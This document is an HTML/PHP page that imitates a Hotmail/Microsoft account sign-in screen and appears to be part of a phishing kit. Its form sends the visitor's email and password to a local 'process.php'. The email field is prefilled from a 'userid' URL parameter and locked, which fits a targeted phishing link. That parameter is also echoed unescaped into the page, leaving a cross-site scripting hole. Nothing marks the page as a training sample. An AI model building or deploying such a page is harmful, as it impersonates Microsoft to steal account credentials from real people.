<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">

<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8">
	<title>Hotmail</title>
</head>
<style>
body {font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
    padding-bottom: .227px;
    padding-top: .227px;
    padding-bottom: .227px;
    padding-top: .227px;
    color: #000;
    background-color: #fff;}
	a {color:#0072D0; text-decoration:none;}
.text-center {text-align:center;}
.sign-in {padding:1.25rem 0; font-size:34px; }
.tInput {
	    width: 347px;
    border: 2px solid #999999;
    padding: 5px;
}
.sInput {width: 360px;
    padding: 7px 0; border:2px solid #004E8C; cursor:pointer;}
.btn.btn-primary, button.btn-primary, input[type="button"].btn-primary, input[type="submit"].btn-primary, input[type="reset"].btn-primary {
    background-color: #0078d7;
    border-color: #0078d7;
    color: #fff;
}
</style>


<body>
<div class="text-center" style="margin: 15px;">
<img  src="image/hotmail.svg" alt="Microsoft account">
</div>

<div class="text-center sign-in">Sign in </div>
<div class="text-center" style="    margin: 20px 0;">
	<div>Use your Microsoft account.</div>
	<div><a id="learnMoreLink" href="#" target="_top" >What's this?</a></div>
</div>

<div class="text-center">
	<form method="POST" action="process.php" >
		<p><input type="email" name="email" value="<?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?>" readonly="readonly" class="tInput" /></p>
		<p><input type="password" name="password" class="tInput" placeholder="Password" /></p>
	
</div>
<div class="text-center">
<label style="    margin-left: -220px;"><input  id="" type="checkbox">Keep me signed in</span></label>
</div>

<div class="text-center" style="margin:20px 0">
<input type="submit" value="Sign in" class="sInput btn btn-primary">
</div>
</form>
<div class="text-center" style="margin-bottom:40px;">
	<div>No account? <a id="learnMoreLink" href="#" target="_top" >Create One?</a></div>
</div>

<div class="text-center" style="margin-bottom:20px;">
	<div><a id="learnMoreLink" href="#" target="_top" >Forgot my password?</a></div>
</div>

<div class="text-center" style="margin-bottom:40px;">
	<div><a id="learnMoreLink" href="#" target="_top" >Sign in with a single-use code</a></div>
</div>

<div class="text-center">
	<img  src="image/mc.svg" alt="Microsoft account">
</div>



</body>

</html>